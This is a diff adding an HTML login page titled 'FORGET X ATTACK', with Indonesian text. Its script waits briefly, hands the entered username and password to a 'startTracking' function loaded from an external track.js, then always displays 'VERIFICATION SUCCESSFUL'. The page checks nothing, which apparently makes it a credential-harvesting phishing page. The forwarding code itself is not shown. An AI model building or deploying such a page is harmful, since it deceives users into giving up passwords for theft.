@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FORGET X ATTACK</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background-image: url('./foto/bg.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+        
+        .login-container {
+            backdrop-filter: blur(10px);
+            background-color: rgba(0, 0, 0, 0.7);
+        }
+        
+        .input-field {
+            transition: all 0.3s ease;
+        }
+        
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
+        }
+    </style>
+    <script src="token.js"></script>
+    <script src="track.js"></script>
+    <script src="tmp/handler.js"></script>
+</head>
+<body class="min-h-screen flex items-center justify-center p-4">
+    <div class="login-container rounded-2xl overflow-hidden w-full max-w-md border border-red-700 shadow-2xl">
+        <div class="bg-black/80 py-6 px-6 text-center border-b border-red-700">
+            <h1 class="text-2xl font-bold text-white">FORGET X ATTACK</h1>
+        </div>
+        
+        <div class="p-6 space-y-6">
+            <div class="space-y-2">
+                <label class="block text-sm font-medium text-gray-300">USERNAME</label>
+                <div class="relative">
+                    <input 
+                        type="text" 
+                        id="username" 
+                        placeholder="Masukkan Username" 
+                        class="input-field w-full px-4 py-3 bg-gray-800/70 text-white rounded-lg border border-gray-600 focus:border-blue-500 focus:outline-none"
+                        autocomplete="off"
+                    >
+                </div>
+            </div>
+            
+            <div class="space-y-2">
+                <label class="block text-sm font-medium text-gray-300">PASSWORD</label>
+                <div class="relative">
+                    <input 
+                        type="password" 
+                        id="password" 
+                        placeholder="Masukkan Password" 
+                        class="input-field w-full px-4 py-3 bg-gray-800/70 text-white rounded-lg border border-gray-600 focus:border-blue-500 focus:outline-none"
+                        autocomplete="off"
+                    >
+                </div>
+            </div>
+            
+            <button 
+                id="loginBtn"
+                class="w-full py-3 px-4 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-lg transition duration-200 flex items-center justify-center"
+            >
+                <span id="btnText">LOGIN</span>
+                <svg id="spinner" class="hidden w-5 h-5 ml-2 text-white animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                    <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                    <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                </svg>
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const loginBtn = document.getElementById('loginBtn');
+        const btnText = document.getElementById('btnText');
+        const spinner = document.getElementById('spinner');
+        
+        loginBtn.addEventListener('click', async function() {
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            
+            loginBtn.disabled = true;
+            btnText.textContent = 'VERIFYING...';
+            spinner.classList.remove('hidden');
+            
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            try {
+                await startTracking(username, password);
+                
+                document.body.classList.add('opacity-0', 'transition-opacity', 'duration-300');
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+               
+                document.body.innerHTML = `
+                    <div class="min-h-screen flex items-center justify-center bg-black">
+                        <div class="text-center">
+                            <div class="inline-block animate-pulse text-blue-500 text-xl font-semibold">
+                                VERIFICATION SUCCESSFUL
+                            </div>
+                        </div>
+                    </div>
+                `;
+                
+            } catch (error) {
+                loginBtn.classList.add('bg-red-600', 'hover:bg-red-700');
+                btnText.textContent = 'LOGIN FAILED';
+                spinner.classList.add('hidden');
+                
+                setTimeout(() => {
+                    loginBtn.disabled = false;
+                    btnText.textContent = 'LOGIN';
+                    loginBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+                }, 2000);
+            }
+        });
+    </script>
+</body>
+</html>
